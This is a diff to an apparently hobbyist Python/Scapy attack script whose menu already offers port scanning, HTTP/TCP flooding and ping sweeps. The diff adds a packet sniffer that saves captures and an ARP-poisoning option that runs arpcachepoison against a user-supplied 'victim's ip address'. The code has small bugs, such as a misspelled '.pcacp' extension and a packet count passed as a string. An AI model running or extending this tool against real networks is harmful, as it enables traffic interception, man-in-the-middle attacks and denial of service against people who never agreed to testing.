@@ -121,6 +121,22 @@ def pingsweep(address):
 		print(deadip," is down ")	
 
 
+def sniffer(iface1,bpf,count1):
+	print("started sniffing packets")
+	pkt=sniff(iface=iface1,filter=bpf,count=count1)
+	a=int(input("""completed packet sniffing
+					1.you want to view packets?
+					2.or you want to save to pcap file?
+		"""))
+	if a==1:
+		print(pkt.nsummary())
+	if a==2:
+		name=input("enter file name you want to save")
+		wrpcap("./"+name+".pcacp",pkt)
+
+
+
+
 choice=int(input("""Enter your choice
 					1.Scan the ports
 					2.Flood http/tcp port
@@ -131,6 +147,8 @@ choice=int(input("""Enter your choice
 					(dont give ur own ip address,
 					dont know y its not working for own ip,
 					working with other ips)
+					7.Sniff the packets
+					8.ARP Posioning
 	"""))
 
 
@@ -181,4 +199,20 @@ if choice==5:
 if choice==6:
 	address=input("enter ip address or range wtith cidr notation")
 	pingsweep(address)
+
+
+if choice==7:
+	iface=input("enter interface u want to sniff on ")
+	bpf=input("enter berkeley packet filter ")
+	count=input("enter number of packets u want to sniff,0 for infinity")
+	sniffer(iface,bpf,count)
+
+if choice==8:
+	targetmac=input("enter you mac address")
+	victimip=input("enter victim's ip address")
+	arpcachepoison(targetmac,victimip,interval=60)
+
+
+
+
 
